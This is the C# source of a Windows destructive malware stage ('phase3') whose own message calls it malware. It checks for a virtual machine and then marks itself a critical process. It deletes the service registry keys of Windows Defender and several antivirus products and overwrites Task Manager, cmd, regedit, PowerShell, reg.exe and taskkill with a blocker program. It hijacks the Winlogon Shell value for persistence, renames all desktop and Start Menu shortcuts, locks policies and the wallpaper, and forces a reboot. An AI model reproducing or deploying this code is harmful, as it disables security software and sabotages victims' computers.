using System;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Linq;
using System.Management;
using System.Windows.Automation;
using System.Collections;

namespace phase3
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        public void SetWallpaper(String path)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        private const int CP_NOCLOSE_BUTTON = 0x200;
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams myCp = base.CreateParams;
                myCp.ClassStyle = myCp.ClassStyle | CP_NOCLOSE_BUTTON;
                return myCp;
            }
        }
        private bool isVM()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        private bool isInstalledDotNetCompatible()
        {
            using (RegistryKey ndpKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\"))
            {
                int releaseKey = Convert.ToInt32(ndpKey.GetValue("Release"));
                if (releaseKey >= 461808)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }

        private bool redistCheck()
        {
            if (File.Exists("C:\\Windows\\System32\\vcruntime140.dll"))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public Form1()
        {
            if (isInstalledDotNetCompatible() == false)
            {
                MessageBox.Show("This app requires .NET Framework 4.7.2 or later to run properly. You can download .NET from Microsoft's website", ".NET Framework Compatibility Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else
            if (redistCheck() == false)
            {
                MessageBox.Show("C++ Redist not found on your system. Download the Microsoft C++ Redists from Microsoft's website", "Redist Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else
            if (isVM() == false)
            {
                MessageBox.Show("You're not using a Virtual Machine, so you may not proceed. If you have been infected on your host, please email the creator at orangemanagementcorpn@gmail.com for steps to remove this malware.", "Virtual Machine Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else
            {
                String thisprocessname = Process.GetCurrentProcess().ProcessName;

                if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
                {
                    Environment.Exit(0);
                }
                this.MaximizeBox = false;
                InitializeComponent();
                this.CenterToScreen(); //just why, can it not be american english
                int isCritical = 1;
                int BreakOnTermination = 0x1D;
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                Next();
                Process deleteservices = new Process();
                deleteservices.StartInfo.FileName = "reg.exe";
                deleteservices.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\" /f";
                deleteservices.StartInfo.Verb = "runas";
                deleteservices.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                deleteservices.Start();
                Process deleteserviescontrolset1 = new Process();
                deleteserviescontrolset1.StartInfo.FileName = "reg.exe";
                deleteserviescontrolset1.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\WinDefend\" /f";
                deleteserviescontrolset1.StartInfo.Verb = "runas";
                deleteserviescontrolset1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                deleteserviescontrolset1.Start();
                Process deletekaspersky = new Process();
                deletekaspersky.StartInfo.FileName = "reg.exe";
                deletekaspersky.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\AVP21.3\" /f";
                deletekaspersky.StartInfo.Verb = "runas";
                deletekaspersky.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                deletekaspersky.Start();
                Process deletekasperskycontrolset1 = new Process();
                deletekasperskycontrolset1.StartInfo.FileName = "reg.exe";
                deletekasperskycontrolset1.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\AVP21.3\" /f";
                deletekasperskycontrolset1.StartInfo.Verb = "runas";
                deletekasperskycontrolset1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                deletekasperskycontrolset1.Start();
                Process deletembam = new Process();
                deletembam.StartInfo.FileName = "reg.exe";
                deletembam.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\MBAMService\" /f";
                deletembam.StartInfo.Verb = "runas";
                deletembam.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                deletembam.Start();
                Process deletembamcontrolset1 = new Process();
                deletembamcontrolset1.StartInfo.FileName = "reg.exe";
                deletembamcontrolset1.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\MBAMService\" /f";
                deletembamcontrolset1.StartInfo.Verb = "runas";
                deletembamcontrolset1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                deletembamcontrolset1.Start();
                Process deletebitdefender = new Process();
                deletebitdefender.StartInfo.FileName = "reg.exe";
                deletebitdefender.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSSERV\" /f";
                deletebitdefender.StartInfo.Verb = "runas";
                deletebitdefender.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                deletebitdefender.Start();
                Process deletebitdefendercontrolset1 = new Process();
                deletebitdefendercontrolset1.StartInfo.FileName = "reg.exe";
                deletebitdefendercontrolset1.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\VSSERV\" /f";
                deletebitdefendercontrolset1.StartInfo.Verb = "runas";
                deletebitdefendercontrolset1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                deletebitdefendercontrolset1.Start();
                string[] filestotakeown = {
                    @"C:\Windows\System32\Taskmgr.exe",
                    @"C:\Windows\System32\perfmon.exe",
                    @"C:\Windows\System32\sethc.exe",
                    @"C:\Windows\System32\cmd.exe",
                    @"C:\Windows\System32\reg.exe",
                    @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe",
                    @"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe",
                    @"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe",
                    @"C:\Windows\regedit.exe",
                    @"C:\Windows\System32\utilman.exe"
                };
                for (int a = 0; a < filestotakeown.Length; a++)
                {
                    Process process = new Process();
                    process.StartInfo.FileName = @"C:\Windows\SystemUpdateResources\backupcmd.exe";
                    process.StartInfo.Arguments = "/c takeown.exe /f \""+filestotakeown[a]+"\" && icacls \""+filestotakeown[a]+"\" /grant \"%username%\":F && copy \"C:\\Windows\\SystemUpdateResources\\BlacklistedApp.exe\" \""+filestotakeown[a]+"\" /y";
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    process.StartInfo.Verb = "runas";
                    process.Start();
                }
            }
        }
        private async void Next()
        {
            await Delay(10000);
            label1.Text = "Restarting";
            await Delay(5000);
            try
            {

            Process backtonormalmode = new Process();
            backtonormalmode.StartInfo.FileName = "bcdedit.exe";
            backtonormalmode.StartInfo.Arguments = "/deletevalue {current} safeboot";
            backtonormalmode.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            backtonormalmode.Start();
            } catch
            {
                MessageBox.Show("bcdedit error");
            }
            try
            {
                RegistryKey phase4 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                phase4.SetValue("Shell", "explorer.exe, wscript.exe \"C:\\Windows\\SystemUpdateResources\\PanOSMainLaunchHelper.vbs\"");
                phase4.Dispose();
            } catch
            {
                MessageBox.Show("Error setting Shell key");
            }
            try
            {
                RegistryKey changeexeicons = Registry.ClassesRoot.OpenSubKey(@"exefile\DefaultIcon", true);
                changeexeicons.SetValue("", @"C:\Windows\SystemUpdateResources\Belfiore.ico");
                changeexeicons.Dispose();
            } catch
            {
                MessageBox.Show("Error setting exe icons");
            }
            //garbage code below
            //try
            //{
                /*AutomationElement aeDesktop = AutomationElement.RootElement;
                AutomationElement elemTemp;
                elemTemp = aeDesktop.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.ClassNameProperty, "SysListView32"));
                AutomationElementCollection collect = aeDesktop.FindAll(TreeScope.Children, new PropertyCondition(AutomationElement.AutomationIdProperty, "ListViewItem"));
                IEnumerator enumer = collect.GetEnumerator();
                var listofdesktopicons = "";
                while (enumer.MoveNext())
                {
                    elemTemp = (AutomationElement)(enumer.Current);
                    listofdesktopicons += (string)elemTemp.GetCurrentPropertyValue(AutomationElement.NameProperty)+"\n";
                }
                listofdesktopicons.Replace("Recycle Bin", "");
                int counter = 1;
                for (var a = 0; a < listofdesktopicons.Length; a++)
                {
                    Process renamedesktopiconnames = new Process();
                    renamedesktopiconnames.StartInfo.FileName = "cmd.exe";
                    renamedesktopiconnames.StartInfo.Arguments = "/c cd %username%\\Desktop && rename "+listofdesktopicons[a]+ ".lnk ıɠɖųʄῳʄɛɧʂƖıơʄɖʂɠŋცʝ۷ƈҳƙ۷ŋɖʂơɠɛῳıཞɧʄཞʂąıɖƖıզ℘ῳąơʄʂɖ۷ŋცʑƙʝҳʄŋɖʂąơɠʄƖıɧɛῳཞ"+counter+".lnk";
                    renamedesktopiconnames.StartInfo.Verb = "runas";
                    renamedesktopiconnames.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    renamedesktopiconnames.Start();
                    counter += 1;
                }
            MessageBox.Show(listofdesktopicons);*/
            //} catch
            //{
                //MessageBox.Show("Error renaming desktop icons");
            //}
            try
            {
                DirectoryInfo d = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
                FileInfo[] Files = d.GetFiles("*.lnk");
                var counter = 1;
                foreach (FileInfo file in Files)
                {
                    file.MoveTo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "ၺ⍎ଽᭁଞ⁚ঃஇஇツᜆṩ⸅Ỗ⓼ᭁଞ⁚ঃஇ২᭪ݶန⧜⯺⤖ᭁଞ⁚ঃஇᭁଞ⁚ঃஇ" + counter+".lnk"));
                    counter += 1;
                }
                DirectoryInfo publicdesktop = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
                FileInfo[] PublicDesktopFiles = publicdesktop.GetFiles("*.lnk");
                foreach (FileInfo file in PublicDesktopFiles)
                {
                    file.MoveTo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory), "ၺ⍎ଽᭁଞ⁚ঃஇஇツᜆṩ⸅Ỗ⓼ᭁଞ⁚ঃஇ২᭪ݶန⧜⯺⤖ᭁଞ⁚ঃஇᭁଞ⁚ঃஇ" + counter + ".lnk"));
                    counter += 1;
                }
                DirectoryInfo startmenufolder = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Start Menu\\Programs"));
                FileInfo[] startmenufolderfiles = startmenufolder.GetFiles("*.lnk");
                foreach (FileInfo file in startmenufolderfiles)
                {
                    file.MoveTo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Start Menu\\Programs\\ၺ⍎ଽᭁଞ⁚ঃஇஇツᜆṩ⸅Ỗ⓼ᭁଞ⁚ঃஇ২᭪ݶန⧜⯺⤖ᭁଞ⁚ঃஇᭁଞ⁚ঃஇ" + counter + ".lnk"));
                    counter += 1;
                }
                DirectoryInfo startmenufolder2 = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Start Menu\\Programs"));
                DirectoryInfo[] startmenufolderfolders = startmenufolder2.GetDirectories();
                foreach (DirectoryInfo file in startmenufolderfolders)
                {
                    file.MoveTo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Start Menu\\Programs\\ၺ⍎ଽᭁଞ⁚ঃஇஇツᜆṩ⸅Ỗ⓼ᭁଞ⁚ঃஇ২᭪ݶန⧜⯺⤖ᭁଞ⁚ঃஇᭁଞ⁚ঃஇ" + counter));
                    counter += 1;
                }
                DirectoryInfo publicstartmenufolder = new DirectoryInfo("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs");
                FileInfo[] publicstartmenufolderfiles = publicstartmenufolder.GetFiles("*.lnk");
                foreach (FileInfo file in publicstartmenufolderfiles)
                {
                    file.MoveTo("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\ၺ⍎ଽᭁଞ⁚ঃஇஇツᜆṩ⸅Ỗ⓼ᭁଞ⁚ঃஇ২᭪ݶန⧜⯺⤖ᭁଞ⁚ঃஇᭁଞ⁚ঃஇ" + counter + ".lnk");
                    counter += 1;
                }
                DirectoryInfo publicstartmenufolder2 = new DirectoryInfo("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs");
                DirectoryInfo[] publicstartmenufolderfolders = publicstartmenufolder2.GetDirectories();
                foreach (DirectoryInfo file in publicstartmenufolderfolders)
                {
                    file.MoveTo("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\ၺ⍎ଽᭁଞ⁚ঃஇஇツᜆṩ⸅Ỗ⓼ᭁଞ⁚ঃஇ২᭪ݶန⧜⯺⤖ᭁଞ⁚ঃஇᭁଞ⁚ঃஇ" + counter);
                    counter += 1;
                }
            } catch
            {
                MessageBox.Show("Error renaming desktop icons");
            }
            try
            {
                Process terminateexplorer = new Process();
                terminateexplorer.StartInfo.FileName = @"C:\Windows\SystemUpdateResources\backupcmd.exe";
                terminateexplorer.StartInfo.Arguments = "/c taskkill /im explorer.exe /f";
                terminateexplorer.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                terminateexplorer.Start();
                Process deleteiconcache = new Process();
                deleteiconcache.StartInfo.FileName = @"C:\Windows\SystemUpdateResources\backupcmd.exe";
                deleteiconcache.StartInfo.Arguments = "/c cd %userprofile%\\AppData\\Local\\Microsoft\\Windows\\Explorer && del iconcache*";
                deleteiconcache.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                deleteiconcache.Start();
                Process deletethumbnailcache = new Process();
                deletethumbnailcache.StartInfo.FileName = @"C:\Windows\SystemUpdateResources\backupcmd.exe";
                deletethumbnailcache.StartInfo.Arguments = "/c cd %userprofile%\\AppData\\Local\\Microsoft\\Windows\\Explorer && del thumbcache*";
                deletethumbnailcache.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                deletethumbnailcache.Start();
                await Delay(2000);
            } catch
            {
                MessageBox.Show("Error clearing icon cache");
            }
            try
            {
                RegistryKey hkcuexplorerstuff = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                hkcuexplorerstuff.SetValue("NoRun", 1);
                hkcuexplorerstuff.SetValue("NoWinKeys", 1);
                hkcuexplorerstuff.Dispose();
            } catch
            {
                MessageBox.Show("Error setting hkcuexplorerstuff");
            }
            try
            {
                RegistryKey setwallpaperfill = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
                setwallpaperfill.SetValue("Wallpaper", @"C:\Windows\SystemUpdateResources\BelfiOre Wallpaper.jpg");
                setwallpaperfill.Dispose();
                RegistryKey disablechangingwallpaper = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop", true);
                disablechangingwallpaper.SetValue("NoChangingWallPaper", 1);
                disablechangingwallpaper.Dispose();
                SetWallpaper(@"C:\Windows\SystemUpdateResources\BelfiOre Wallpaper.jpg");
            } 
            catch 
            {
                MessageBox.Show("Error setting wallpaper policy");
            }
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = @"C:\Windows\SystemUpdateResources\backupcmd.exe";
                process.StartInfo.Arguments = "/c takeown.exe /f \"C:\\Windows\\System32\\taskkill.exe\" && icacls \"C:\\Windows\\System32\\taskkill.exe\" /grant \"%username%\":F && copy \"C:\\Windows\\SystemUpdateResources\\BlacklistedApp.exe\" \"C:\\Windows\\System32\\taskkill.exe\" /y";
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.StartInfo.Verb = "runas";
                process.Start();
                Process process2 = new Process();
                process2.StartInfo.FileName = @"C:\Windows\SystemUpdateResources\backupcmd.exe";
                process2.StartInfo.Arguments = "/c takeown.exe /f \"C:\\Windows\\System32\\reg.exe\" && icacls \"C:\\Windows\\System32\\reg.exe\" /grant \"%username%\":F && copy \"C:\\Windows\\SystemUpdateResources\\BlacklistedApp.exe\" \"C:\\Windows\\System32\\reg.exe\" /y";
                process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process2.StartInfo.Verb = "runas";
                process2.Start();
            }
            catch
            {
                MessageBox.Show("error deleting taskkill.exe");
            }
            try
            {
                int isCritical = 0;
                int BreakOnTermination = 0x1D;
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            }catch
            {
                MessageBox.Show("Error exiting critical process mode");
            }
            try
            {
                Process reboot = new Process();
                reboot.StartInfo.FileName = "shutdown.exe";
                reboot.StartInfo.Arguments = "-r -t 0";
                reboot.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                reboot.Start();
            } catch
            {
                MessageBox.Show("Error rebooting");
            }
        }
        private async Task Delay(int howlong)
        {
            await Task.Delay(howlong);
        }

    }
}
